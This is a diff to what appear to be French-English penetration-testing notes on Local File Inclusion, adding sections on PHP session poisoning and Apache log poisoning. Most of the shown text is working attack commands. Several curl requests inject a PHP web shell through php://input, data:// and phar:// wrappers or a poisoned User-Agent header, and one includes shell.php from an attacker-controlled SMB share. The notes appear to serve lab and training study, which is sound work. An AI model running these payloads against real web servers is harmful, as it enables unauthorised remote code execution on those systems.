@@ -1,5 +1,6 @@
 ## File Inclusion / Local File Inclusion
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+https://academy.hackthebox.com/module/23/section/252
 
 > Différence entre Local File Inclusion & Path Traversal : https://www.perplexity.ai/search/c-est-quoi-la-difference-entre-IcqEhcTNSQG4xydII.zABA
 
@@ -98,7 +99,7 @@ $ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64
 -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Usinng Input wrapper
+Using Input wrapper
 
 ```bash
 $ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
@@ -154,7 +155,7 @@ curl 'http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cm
 
 ### LFI to File Uploads
 
-| Language | Function/Instruction        | Read Content | Execute | Remote URL |
+| Language | Function/Instruction       | Read Content | Execute | Remote URL |
 |----------|----------------------------|:------------:|:-------:|:----------:|
 | PHP      | include()/include_once()   |      ✅      |   ✅    |     ✅     |
 | PHP      | require()/require_once()   |      ✅      |   ✅    |     ❌     |
@@ -194,7 +195,7 @@ $ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 $ curl 'http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id'
 ```
 
-### PHP Session Poisoning & Server Log Poisoning 
+### PHP Session Poisoning
 
 | Language | Function/Instruction        | Read Content | Execute | Remote URL |
 |----------|----------------------------|:------------:|:-------:|:----------:|
@@ -203,3 +204,25 @@ $ curl 'http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/she
 | NodeJS   | res.render()               |      ✅      |   ✅    |     ❌     |
 | Java     | import                     |      ✅      |   ✅    |     ✅     |
 | .NET     | include                    |      ✅      |   ✅    |     ✅     |
+
+
+When users have a PHPSESSID defined and the application is vulnerable to file inclusion, we can abuse it:
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E (<?php system($_GET["cmd"]);?> in URL encode)
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+(Repeat the processus for every command)
+
+### Server Log Poisoning
+When the application is vulnerable to LFI and we can display logs inside the web application.
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
+```
+
+```bash
+$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
